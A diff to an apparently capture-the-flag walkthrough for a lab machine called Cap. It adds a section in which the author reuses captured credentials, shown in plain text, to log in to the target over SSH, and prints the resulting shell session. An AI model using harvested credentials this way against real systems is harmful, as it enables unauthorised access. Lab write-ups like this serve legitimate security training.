@@ -237,3 +237,44 @@ Credentials:
 
 `nathan`:`Buck3tH4TF0RM3!`
 
+## Attempting to SSH with found credentials
+Acquiring some credentials the first thing I did was to check if `nathan` reuses passwords - I tried to ssh into the machine:
+
+```bash
+(sz3kz@kali)~{tun0:10.10.14.19}~[Cap]$ ssh nathan@$IP
+nathan@10.10.10.245's password:
+Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sat Jan 25 20:38:22 UTC 2025
+
+  System load:           0.04
+  Usage of /:            36.6% of 8.73GB
+  Memory usage:          23%
+  Swap usage:            0%
+  Processes:             229
+  Users logged in:       0
+  IPv4 address for eth0: 10.10.10.245
+  IPv6 address for eth0: dead:beef::250:56ff:feb0:d24d
+
+  => There are 4 zombie processes.
+
+
+63 updates can be applied immediately.
+42 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Sat Jan 25 20:37:09 2025 from 10.10.14.19
+nathan@cap:~$
+```
+
+I am on the machine now!
